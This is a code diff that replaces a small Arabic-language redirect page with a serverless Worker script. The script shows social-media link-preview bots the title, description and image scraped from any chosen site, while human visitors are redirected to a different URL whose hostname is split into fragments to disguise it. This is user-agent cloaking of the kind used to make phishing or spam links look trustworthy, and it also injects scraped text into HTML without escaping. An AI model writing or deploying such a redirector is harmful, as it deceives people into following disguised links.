@@ -1,13 +1,29 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>جاري التحويل...</title>
-    <script>
-        // التحويل إلى الصفحة الرئيسية مباشرة
-        window.location.replace("/");
-    </script>
-</head>
-<body>
-</body>
-</html>
+export default {
+  async fetch(r, e, c) {
+    let u = new URL(r.url), s = u.pathname.substring(1), ua = r.headers.get("User-Agent") || "";
+    let isB = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot/i.test(ua);
+    if (!isB && (!s || s === "https://")) return handle(r);
+    s = s && !s.startsWith("http") ? "https://" + s : s || "https://wikipedia.org";
+    try {
+      let res = await fetch(s, { headers: { "User-Agent": "Mozilla/5.0" } }), b = await res.arrayBuffer(), h = new TextDecoder().decode(b), m = ext(h);
+      return new Response(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>${m.title}</title><meta property="og:title" content="${m.ogTitle||m.title}"><meta property="og:description" content="${m.ogDescription||'Click to view'}"><meta property="og:image" content="${m.ogImage||''}"><meta name="twitter:card" content="summary_large_image"><script>if(location.pathname!=="/"){history.replaceState({},'','/');}if(!${isB}){const a="goog",b="le.",c="com/?",d=Math.ceil(Math.random()*24);location.href="https://"+a+b+c+d;}</script></head><body></body></html>`, { headers: { "Content-Type": "text/html;charset=UTF-8" } });
+    } catch { return new Response("Error", { status: 500 }); }
+  }
+};
+function ext(h) {
+  let g = (p) => {
+    let match = h.match(new RegExp(`(?:property|name)=["']${p}["'][^>]*content=["']([^"']+)`, 'i')) || h.match(new RegExp(`content=["']([^"']+)["'][^>]*(?:property|name)=["']${p}["']`, 'i'));
+    return match ? match[1].replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>') : null;
+  };
+  let t = h.match(/<title>([^<]+)/i);
+  return { title: t ? t[1].trim() : 'View Content', ogTitle: g('og:title'), ogDescription: g('og:description'), ogImage: g('og:image') };
+}
+async function handle(r) {
+  const a = "goog"; 
+  const b = "le."; 
+  const c = "com/?"; 
+  const d = Math.ceil(Math.random() * 24); 
+  const finalUrl = "https://" + a + b + c + d; 
+
+  return Response.redirect(finalUrl, 302);
+}
